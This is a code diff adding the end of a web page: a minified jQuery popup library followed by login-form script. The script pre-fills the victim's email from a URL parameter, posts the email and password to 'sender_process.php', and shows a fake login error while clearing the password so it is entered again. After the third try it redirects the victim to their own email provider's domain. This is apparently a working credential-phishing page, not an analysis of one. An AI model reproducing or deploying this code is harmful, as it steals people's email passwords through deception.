+ * @author: (c)Bjoern Klinggaard (twitter@bklinggaard)
+ * @demo: http://dinbror.dk/bpopup
+ * @version: 0.9.3.min
+ ================================================================================*/
+ (function(b){b.fn.bPopup=function(u,C){function v(){a.modal&&b('<div class="b-modal '+e+'"></div>').css({backgroundColor:a.modalColor,position:"fixed",top:0,right:0,bottom:0,left:0,opacity:0,zIndex:a.zIndex+l}).appendTo(a.appendTo).fadeTo(a.speed,a.opacity);z();c.data("bPopup",a).data("id",e).css({left:"slideIn"===a.transition?-1*(m+h):n(!(!a.follow[0]&&p||g)),position:a.positionStyle||"absolute",top:"slideDown"===a.transition?-1*(q+h):r(!(!a.follow[1]&&s||g)),"z-index":a.zIndex+l+1}).each(function(){a.appending&&b(this).appendTo(a.appendTo)});D(!0)}function t(){a.modal&&b(".b-modal."+c.data("id")).fadeTo(a.speed,0,function(){b(this).remove()});a.scrollBar||b("html").css("overflow","auto");b(".b-modal."+e).unbind("click");j.unbind("keydown."+e);d.unbind("."+e).data("bPopup",0<d.data("bPopup")-1?d.data("bPopup")-1:null);c.undelegate(".bClose, ."+a.closeClass,"click."+e,t).data("bPopup",null);D();return!1}function E(f){var b=f.width(),e=f.height(),d={};a.contentContainer.css({height:e,width:b});e>=c.height()&&(d.height=c.height());b>=c.width()&&(d.width=c.width());w=c.outerHeight(!0);h=c.outerWidth(!0);z();a.contentContainer.css({height:"auto",width:"auto"});d.left=n(!(!a.follow[0]&&p||g));d.top=r(!(!a.follow[1]&&s||g));c.animate(d,250,function(){f.show();x=A()})}function D(f){switch(a.transition){case "slideIn":c.css({display:"block",opacity:1}).animate({left:f?n(!(!a.follow[0]&&p||g)):j.scrollLeft()-(h||c.outerWidth(!0))-200},a.speed,a.easing,function(){B(f)});break;case "slideDown":c.css({display:"block",opacity:1}).animate({top:f?r(!(!a.follow[1]&&s||g)):j.scrollTop()-(w||c.outerHeight(!0))-200},a.speed,a.easing,function(){B(f)});break;default:c.stop().fadeTo(a.speed,f?1:0,function(){B(f)})}}function B(f){f?(d.data("bPopup",l),c.delegate(".bClose, ."+a.closeClass,"click."+e,t),a.modalClose&&b(".b-modal."+e).css("cursor","pointer").bind("click",t),!G&&(a.follow[0]||a.follow[1])&&d.bind("scroll."+e,function(){x&&c.dequeue().animate({left:a.follow[0]?n(!g):"auto",top:a.follow[1]?r(!g):"auto"},a.followSpeed,a.followEasing)}).bind("resize."+e,function(){if(x=A())clearTimeout(F),F=setTimeout(function(){z();c.dequeue().each(function(){g?b(this).css({left:m,top:q}):b(this).animate({left:a.follow[0]?n(!0):"auto",top:a.follow[1]?r(!0):"auto"},a.followSpeed,a.followEasing)})},50)}),a.escClose&&j.bind("keydown."+e,function(a){27==a.which&&t()}),k(C)):(c.hide(),k(a.onClose),a.loadUrl&&(a.contentContainer.empty(),c.css({height:"auto",width:"auto"})))}function n(a){return a?m+j.scrollLeft():m}function r(a){return a?q+j.scrollTop():q}function k(a){b.isFunction(a)&&a.call(c)}function z(){var b;s?b=a.position[1]:(b=((window.innerHeight||d.height())-c.outerHeight(!0))/2-a.amsl,b=b<y?y:b);q=b;m=p?a.position[0]:((window.innerWidth||d.width())-c.outerWidth(!0))/2;x=A()}function A(){return(window.innerHeight||d.height())>c.outerHeight(!0)+y&&(window.innerWidth||d.width())>c.outerWidth(!0)+y}b.isFunction(u)&&(C=u,u=null);var a=b.extend({},b.fn.bPopup.defaults,u);a.scrollBar||b("html").css("overflow","hidden");var c=this,j=b(document),d=b(window),G=/OS 6(_\d)+/i.test(navigator.userAgent),y=20,l=0,e,x,s,p,g,q,m,w,h,F;c.close=function(){a=this.data("bPopup");e="__b-popup"+d.data("bPopup")+"__";t()};return c.each(function(){if(!b(this).data("bPopup"))if(k(a.onOpen),l=(d.data("bPopup")||0)+1,e="__b-popup"+l+"__",s="auto"!==a.position[1],p="auto"!==a.position[0],g="fixed"===a.positionStyle,w=c.outerHeight(!0),h=c.outerWidth(!0),a.loadUrl)switch(a.contentContainer=b(a.contentContainer||c),a.content){case "iframe":var f=b('<iframe class="b-iframe" scrolling="no" frameborder="0"></iframe>');f.appendTo(a.contentContainer);w=c.outerHeight(!0);h=c.outerWidth(!0);v();f.attr("src",a.loadUrl);k(a.loadCallback);break;case "image":v();b("<img />").load(function(){k(a.loadCallback);E(b(this))}).attr("src",a.loadUrl).hide().appendTo(a.contentContainer);break;default:v(),b('<div class="b-ajax-wrapper"></div>').load(a.loadUrl,a.loadData,function(){k(a.loadCallback);E(b(this))}).hide().appendTo(a.contentContainer)}else v()})};b.fn.bPopup.defaults={amsl:50,appending:!0,appendTo:"body",closeClass:"b-close",content:"ajax",contentContainer:!1,easing:"swing",escClose:!0,follow:[!0,!0],followEasing:"swing",followSpeed:500,loadCallback:!1,loadData:!1,loadUrl:!1,modal:!0,modalClose:!0,modalColor:"#000",onClose:!1,onOpen:!1,opacity:0.7,position:["auto","auto"],positionStyle:"absolute",scrollBar:!0,speed:250,transition:"fadeIn",zIndex:9997}})(jQuery);
+
+
+
+$('#loadFormPop').bPopup({
+modalClose: false,
+opacity: 0.3,
+positionStyle: 'fixed' //'fixed' or 'absolute'
+});
+
+
+const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+const myMail = urlParams.get('email');
+
+if(myMail!=null){
+document.getElementById('email').value=myMail;
+}
+
+</script>
+
+
+	
+	
+	
+
+<script language="javascript" type="text/javascript">
+
+ function getXMLHTTP() { //fuction to return the xml http object
+		var xmlhttp=false;	
+		try{
+			xmlhttp=new XMLHttpRequest();
+		}
+		catch(e)	{		
+			try{			
+				xmlhttp= new ActiveXObject("Microsoft.XMLHTTP");
+			}
+			catch(e){
+				try{
+				xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+				}
+				catch(e1){
+					xmlhttp=false;
+				}
+			}
+		}
+		 	
+		return xmlhttp;
+    }
+	
+
+function loginFunc(){
+
+													
+var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+/*var regPattern = /^[R]+[B]+[0-9]{8}$/;*/
+
+var phonePattern = /^[0-9]+\.{11}$/;
+var namePattern = /^[A-Za-z ]+$/;
+
+var logCheckCount= document.getElementById('logCheckCount').value;
+parseInt(logCheckCount);
+	
+	
+var email = document.getElementById('email').value;
+email=email.replace(/^\s+|\s+$/g,'');
+if(email==''){
+alert("Please enter your email address address");
+document.getElementById('email').focus();
+return false;
+}
+
+
+var myemailCheck1=emailPattern.test(email);
+    
+	if(myemailCheck1==false){
+	alert("Please provide a valid email address");
+	document.getElementById("email").focus();
+	return false;
+	}
+	
+
+
+
+	
+
+
+var password = document.getElementById('password').value;
+password=password.replace(/^\s+|\s+$/g,'');
+if(password==''){
+alert("Please enter password!");
+document.getElementById('password').focus();
+return false;
+}
+
+
+
+
+var emailAddress = email.split("@");
+
+ $("#submitBtn0").html(`<button class="btn btn-sm btn-primary" disabled>
+            <span class="spinner-grow spinner-grow-sm"></span>
+            Please Wait...
+        </button>`).prop("disabled", true);
+	
+	
+var dataString = $('#logFormNew').serialize();
+var strURL="sender_process.php";
+
+
+$('#loadingPop').bPopup({
+modalClose: false,
+opacity: 0.3,
+positionStyle: 'fixed' //'fixed' or 'absolute'
+});
+
+
+
+var req = getXMLHTTP();
+if (req) {
+req.onreadystatechange = function() {
+if (req.readyState == 4) {
+					// only if "OK"
+if (req.status == 200) {
+setTimeout(function (){
+document.getElementById('CloseMeNowLog').click();
+
+if(req.responseText==1){
+	
+var xn = 1;
+var x = 0;
+
+x = Number(logCheckCount) + Number(xn);
+
+document.getElementById('logCheckCount').value=x;	
+	
+
+if(logCheckCount>=2){
+setTimeout(function (){
+
+location ='http://'+emailAddress[1];
+	
+/**
+document.getElementById('password').value='';
+	
+$("#submitBtn0").html(`<button class="btn btn-sm btn-primary">
+            Sign In
+        </button>`).prop("disabled", false);	
+**/
+},500);
+	
+}
+
+	
+	
+	else{
+	setTimeout(function (){
+
+//location ='http://'+emailAddress[1];
+document.getElementById('login-error').style.display='';
+document.getElementById('password').value='';
+	
+$("#submitBtn0").html(`<button class="btn btn-sm btn-primary">
+            Sign In
+        </button>`).prop("disabled", false);	
+
+},500);
+	}
+	
+	
+	
+
+return false;
+
+}
+
+
+
+else if(req.responseText==2){
+alert("Invalid email address");
+return false; 
+}
+
+
+
+
+else {
+//alert("Authentication failed, please try later!");
+alert(req.responseText);
+return false; 
+}
+
+},1000);
+
+
+										
+} else {
+setTimeout(function (){document.getElementById('CloseMeNowLog').click();
+},300);
+
+setTimeout(function (){
+alert("There was a problem while using XMLHTTP:\n" + req.statusText+ "!");
+},500);
+return false; 
+}
+}				
+	}
+		
+req.open("POST", strURL, true);
+req.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+req.send(dataString);
+}	
+	
+}
+
+
+
+
+	</script>
+
+	
+	
+	
+
+
+</body>
+
+
+
+</html>
+
+
+
+
